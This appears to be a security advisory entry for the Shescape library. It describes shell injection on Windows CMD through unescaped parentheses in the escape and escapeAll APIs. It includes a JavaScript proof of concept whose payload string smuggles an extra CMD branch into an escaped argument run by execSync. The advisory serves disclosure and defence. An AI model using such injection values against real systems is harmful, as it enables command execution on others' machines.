title: "Shescape: Shell injection via unescaped parentheses on Windows with CMD"
description: "This impacts users of Shescape on Windows that explicitly configure
  `shell` to CMD, or `true` with the default shell being CMD, using the `escape` and
  `escapeAll` APIs.\n\nAn attacker may be able to achieve shell injection depending
  on the original command.\n\n```javascript\nimport * as cp from \"node:child_process\";\nimport
  { Shescape } from \"shescape\";\n\n// 1. Prerequisites\nconst options = {\nshell:
  \"cmd.exe\",\n// Or\nshell: true, // Only if the default shell is CMD\n};\n\n//
  2. Payload\nconst payload = \"x) else if a==a (echo y\";\n\n// 3. Usage\nconst shescape
  = new Shescape(options);\nlet escapedPayload;\n\nescapedPayload = shescape.escape(payload);\n//
  Or\nescapedPayload = shescape.escapeAll([payload]);\n\n// And (example)\nconst result
  = cp.execSync(`if defined FALSY (echo ${escapedPayload})`, options);\n\n// 4. Impact\nconsole.log(result.toString());\n//
  Outputs \"y\" instead of \"\"\n\n```"
